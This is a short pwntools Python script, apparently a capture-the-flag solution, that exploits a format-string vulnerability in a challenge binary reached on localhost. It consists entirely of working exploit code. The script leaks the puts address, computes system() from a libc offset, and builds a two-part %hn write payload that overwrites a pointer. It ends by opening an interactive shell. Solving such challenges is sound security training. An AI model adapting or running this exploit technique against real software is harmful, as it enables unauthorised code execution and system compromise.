from pwn import *

#p = process('./chall') 
p = remote('localhost',1001) # for remote connection

# skip unrelevant iterations
def iterate_with_n(n:int):
  for i in range(n):
    p.recvuntil(b'next spell]')
    p.sendline(b'') # send new line character only 


def main():
  iterate_with_n(3)

  # receive both addresses
  p.recvuntil(b'0x')
  puts_address = int(p.recvuntil(b' ',drop=True),16) # needed to calculate the address of system
  p.recvuntil(b'0x')
  next_address = int(p.recvline(b' ')[:-1],16)
  offset_to_system = 0x2b130 # calculated using the provided libc 
  input_buffer_offset = 4 # using a debugger or a payload : %p %p %p %p %p 

  # the most important address
  system_address =  puts_address -int(offset_to_system)
  lower_half = system_address & 0xffff
  upper_half = (system_address >> 16) & 0xffff 
  payload = (p32(next_address)+p32(next_address+2)+
           b'%'+str(lower_half - 8).encode()+b'x%'+str(input_buffer_offset).encode()+b'$hn'+
           b'%'+str(upper_half - lower_half).encode()+b'x%'+str(input_buffer_offset+1).encode()+b'$hn'
  )

  iterate_with_n(8)
  p.recvuntil(b'wise !\n')
  p.sendline(payload)
  p.recvuntil(b'next spell]')

  # we get a shell right after this line
  p.sendline(b'')
  p.interactive() 



if __name__ == "__main__" :
  main()
